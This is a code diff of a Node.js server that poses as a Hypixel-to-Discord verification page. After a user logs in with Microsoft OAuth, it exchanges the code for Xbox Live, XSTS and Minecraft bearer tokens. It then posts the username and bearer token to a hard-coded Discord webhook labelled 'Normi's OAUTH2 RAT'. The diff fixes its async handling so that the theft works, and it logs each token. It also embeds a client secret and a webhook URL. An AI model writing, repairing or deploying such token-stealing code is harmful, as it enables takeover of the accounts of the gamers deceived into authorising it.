@@ -1,23 +1,33 @@
 const client_secret = 'HkL8Q~Lpyn6H6pI~3ENbt5wmNa9JNV3zHTlWlcqj'
-client_id = '60ed774d-82c5-4864-9038-231bcf8aac1a'
-const redirect_uri = 'https://hypixeltodiscordverify.herokuapp.com/'
-webhook_url = 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'
+const client_id = 'a7f62b5a-c66b-47f1-a6f9-fb7938cac361'
+const redirect_uri = 'http://localhost:3000/'
+const webhook_url = 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD7svz30JTn91tMSx02dTfZ0Ixmtk96eXOkOS9Klyu33AZnv2mPrxDHEEsefVsfI'
 
 const axios = require('axios')
 const express = require('express')
+require("json");
 const app = express()
-const port = process.env.PORT || 8080
+const port = process.env.PORT || 3000
 
-app.get('/', (req, res) => {
+app.get('/', async (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
-        const code = req.query.code
-        const accessToken = getAccessToken(code)
-        const userHash = getUserHashAndToken(accessToken)[0]
-        const userToken = getUserHashAndToken(accessToken)[1]
-        const xstsToken = getXSTSToken(userToken)
-        const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
-        const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
-        postToWebhook(username, bearerToken)
+    const code = req.query.code
+    console.log(code + " is the code\n")
+    const accessToken = await getAccessToken(code)
+    console.log(accessToken + " is the access token\n")
+    const hashAndTokenArray = await getUserHashAndToken(accessToken)
+    const userToken = hashAndTokenArray[0]
+    console.log(userToken + " is the user token\n")
+    const userHash = hashAndTokenArray[1]
+    console.log(userToken + " is the user hash\n")
+    const xstsToken = await getXSTSToken(userToken)
+    console.log(xstsToken + " is the xsts token\n")
+    const bearerAndUsernameArray = await getBearerTokenAndUsername(xstsToken, userHash)
+    const bearerToken = bearerAndUsernameArray[0]
+    console.log(bearerToken + " is the bearer token\n")
+    const username = bearerAndUsernameArray[1]
+    console.log(username + " is the username\n")
+    postToWebhook(username, bearerToken)
 })
 
 app.listen(port, () => {
@@ -26,86 +36,81 @@ app.listen(port, () => {
 
 async function getAccessToken(code) {
     const url = 'https://login.live.com/oauth20_token.srf'
-    const headers = {
-        'Content-Type': 'application/x-www-form-urlencoded'
+
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
     }
-    const data = {
+    let data = {
         client_id: client_id,
         redirect_uri: redirect_uri,
         client_secret: client_secret,
         code: code,
         grant_type: 'authorization_code'
     }
-    let response = await axios.post(url, data, headers)
-    return response.data.access_token
+
+    let response = await axios.post(url, data, config)
+    return response.data['access_token']
 }
 
 async function getUserHashAndToken(accessToken) {
     const url = 'https://user.auth.xboxlive.com/user/authenticate'
-    const headers = {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json',
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
     }
-    const data = {
+    let data = {
         Properties: {
-            AuthMethod: 'RPS',
-            SiteName: 'user.auth.xboxlive.com',
-            RpsTicket: `d=${accessToken}`
-        },
-        RelyingParty: 'http://auth.xboxlive.com',
-        TokenType: 'JWT'
+            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
+        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
     }
-    let response = await axios.post(url, data, headers)
-    return response.data.Token, response.data.DisplayClaims.xui[0].uhs
+    let response = await axios.post(url, data, config)
+    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
 }
 
 async function getXSTSToken(userToken) {
     const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
-    const headers = {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json',
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
     }
-    const data = {
+    let data = {
         Properties: {
             SandboxId: 'RETAIL',
             UserTokens: [userToken]
-        },
-        RelyingParty: 'rp://api.minecraftservices.com/',
-        TokenType: 'JWT'
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
     }
-    let response = await axios.post(url, data, headers)
-    return response.data.Token
+    let response = await axios.post(url, data, config)
+
+    return response.data['Token']
 }
 
 async function getBearerTokenAndUsername(xstsToken, userHash) {
     const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
-    const headers = {
-        'Content-Type': 'application/json',
+    const config = {
+        headers: {
+            'Content-Type': 'application/json',
+        }
     }
-    const data = {
-        identityToken: `XBL3.0 x=${userHash};${xstsToken}`,
-        ensureLegacyEnabled: true
+    let data = {
+        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
     }
-    let response = await axios.post(url, data, headers)
-    return response.data.access_token, response.data.username
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['username']]
 }
 
 function postToWebhook(username, bearerToken) {
     const url = webhook_url
-    const headers = {
-        'Content-Type': 'application/json',
-    }
-    const data = {
+    let data = {
         username: "Normi's OAUTH2 RAT",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
         content: "||@everyone||",
-        embeds: [
-            {
-                title: "User Info",
-                description: `Username: ${username}\nBearer Token: ${bearerToken}`,
-                color: 0x00ff00
-            }
-        ]
+        embeds: [{
+            title: "User Info", description: `Username: ${username}\nBearer Token: ${bearerToken}`, color: 0x00ff00
+        }]
     }
-    axios.post(url, data, headers)
+    axios.post(url, data).then(r => console.log(r.data))
 }
